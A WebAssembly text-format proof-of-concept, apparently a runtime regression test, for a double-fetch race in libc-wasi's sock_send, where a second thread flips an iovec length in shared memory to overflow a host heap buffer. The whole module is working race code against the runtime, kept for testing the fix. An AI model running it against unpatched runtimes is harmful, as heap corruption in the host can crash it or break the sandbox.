;; Copyright (C) 2026 Intel Corporation. All rights reserved.
;; SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception
;;
;; PoC for the iovec double fetch in libc-wasi. The main thread calls sock_send
;; while a wasi-threads thread flips iovec[0].buf_len between 16 and 4096 in
;; shared memory. Before the fix, the length read for sizing and the length
;; read for copying can differ, which overflows the heap buffer. After the fix,
;; every call sends a consistent snapshot and the module prints "race done".
;;
;; Guest layout:
;;   0x100: iovec[0] = { buf_offset = 0x1000, buf_len = 16 }
;;   0x104: buf_len, rewritten by the writer thread
;;   0x200: done flag, set by the writer thread
;;   0x300: fd_write iovec for the final message
;;   0x308: fd_write nwritten output
(module
  (import "wasi" "thread-spawn"
    (func $thread_spawn (param i32) (result i32)))
  (import "wasi_snapshot_preview1" "sock_send"
    (func $sock_send (param i32 i32 i32 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "fd_write"
    (func $fd_write (param i32 i32 i32 i32) (result i32)))

  (memory (export "memory") 1 1 shared)
  (data (i32.const 0x100) "\00\10\00\00\10\00\00\00")
  (data (i32.const 0x300) "\00\10\00\00\0a\00\00\00")
  (data (i32.const 0x1000) "race done\0a")

  (global $iterations i32 (i32.const 20000))

  (func (export "wasi_thread_start") (param $tid i32) (param $arg i32)
    (local $i i32)
    (block $done
      (loop $next
        (br_if $done (i32.ge_u (local.get $i) (global.get $iterations)))
        (i32.atomic.store (i32.const 0x104)
          (select (i32.const 4096) (i32.const 16)
                  (i32.and (local.get $i) (i32.const 1))))
        (local.set $i (i32.add (local.get $i) (i32.const 1)))
        (br $next)))
    (i32.atomic.store (i32.const 0x200) (i32.const 1)))

  (func (export "_start")
    (local $i i32)
    (drop (call $thread_spawn (i32.const 0)))
    (block $done
      (loop $next
        (br_if $done (i32.ge_u (local.get $i) (global.get $iterations)))
        (drop (call $sock_send (i32.const 99) (i32.const 0x100) (i32.const 1)
                               (i32.const 0) (i32.const 0x308)))
        (local.set $i (i32.add (local.get $i) (i32.const 1)))
        (br $next)))
    (loop $wait
      (br_if $wait (i32.eqz (i32.atomic.load (i32.const 0x200)))))
    (drop (call $fd_write (i32.const 1) (i32.const 0x300) (i32.const 1)
                          (i32.const 0x308))))
)
